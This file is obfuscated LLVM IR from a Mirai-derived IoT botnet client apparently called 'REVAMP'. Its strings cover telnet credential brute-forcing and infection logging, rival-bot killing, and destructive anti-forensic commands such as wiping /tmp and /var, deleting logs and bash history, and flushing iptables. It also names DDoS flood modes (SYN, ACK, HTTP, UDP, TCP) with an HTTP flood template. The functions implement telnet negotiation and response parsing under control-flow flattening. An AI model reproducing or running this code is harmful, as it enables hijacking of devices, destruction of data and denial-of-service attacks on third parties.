@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.473 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.474 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.475 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.476 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.477 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.478 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.479 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.480 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.481 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.482 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.483 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.484 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.485 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.486 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.487 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.488 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.489 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.490 = private unnamed_addr constant [91 x i8] c"[ REVAMP ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.491 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.492 = private unnamed_addr constant [78 x i8] c"[ REVAMP ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.493 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.494 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.495 = private unnamed_addr constant [75 x i8] c"[ REVAMP ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.496 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.497 = private unnamed_addr constant [85 x i8] c"[ REVAMP ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.498 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.499 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.500 = private unnamed_addr constant [11 x i8] c"d0mQacDMH0\00", align 1
@.str.501 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.502 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.503 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.504 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.505 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.506 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.507 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.508 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.509 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.511 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.512 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.513 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.514 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.516 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.518 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.519 = private unnamed_addr constant [5 x i8] c"ZUDP\00", align 1
@.str.520 = private unnamed_addr constant [5 x i8] c"ZTCP\00", align 1
@.str.521 = private unnamed_addr constant [5 x i8] c"ZSTD\00", align 1
@.str.522 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.523 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.524 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.525 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.528 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.529 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.530 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.531 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.532 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.526 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.527 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.533 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.534 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.535 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.536 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.537 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -764559080, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -764559080, label %10
    i32 -1686279537, label %14
    i32 -294715642, label %32
    i32 -52128847, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -1686279537, i32 -52128847
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -294715642, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -764559080, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 853063158, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 853063158, label %first
    i32 -441517939, label %30
    i32 -1002074390, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -441517939, i32 -1002074390
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -1002074390, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -575054131, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -575054131, label %8
    i32 1919418800, label %17
    i32 1814864403, label %18
    i32 -23339184, label %19
    i32 147390783, label %24
    i32 484824661, label %34
    i32 1203855530, label %35
    i32 440017653, label %36
    i32 -478925083, label %39
    i32 -1301878245, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 1919418800, i32 1814864403
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -575054131, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -23339184, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 147390783, i32 -478925083
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 484824661, i32 1203855530
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1301878245, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 440017653, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -23339184, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1301878245, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 330324999, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 330324999, label %first
    i32 433880261, label %7
    i32 1022182504, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 1022182504, i32 433880261
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 1022182504, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 1164937643, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1164937643, label %18
    i32 1999228591, label %27
    i32 11624146, label %44
    i32 -472446920, label %45
    i32 2031799165, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 1999228591, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 11624146, i32 -472446920
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2031799165, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 2031799165, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1423569262, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1423569262, label %first
    i32 152202722, label %28
    i32 -192304694, label %32
    i32 -636477722, label %38
    i32 -1354916412, label %39
    i32 -1949863889, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 152202722, i32 -192304694
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 -192304694, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -636477722, i32 -1354916412
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -1949863889, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -1949863889, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1339778382, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1339778382, label %NodeBlock
    i32 470407933, label %LeafBlock1
    i32 1141975154, label %LeafBlock
    i32 76840788, label %16
    i32 1001655833, label %17
    i32 1471350718, label %26
    i32 461506706, label %27
    i32 310263199, label %34
    i32 1095275089, label %35
    i32 1245252819, label %42
    i32 80652979, label %50
    i32 2028604245, label %58
    i32 -1991724065, label %59
    i32 1923690322, label %60
    i32 660283018, label %NewDefault
    i32 1737372472, label %67
    i32 -600952138, label %68
    i32 -1439518735, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 1141975154, i32 470407933
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 76840788, i32 660283018
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 1001655833, i32 660283018
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1439518735, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 1471350718, i32 461506706
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 1923690322, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 310263199, i32 1095275089
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1991724065, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 1245252819, i32 80652979
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 2028604245, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 2028604245, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1991724065, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 1923690322, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -600952138, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1737372472, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -600952138, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1439518735, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

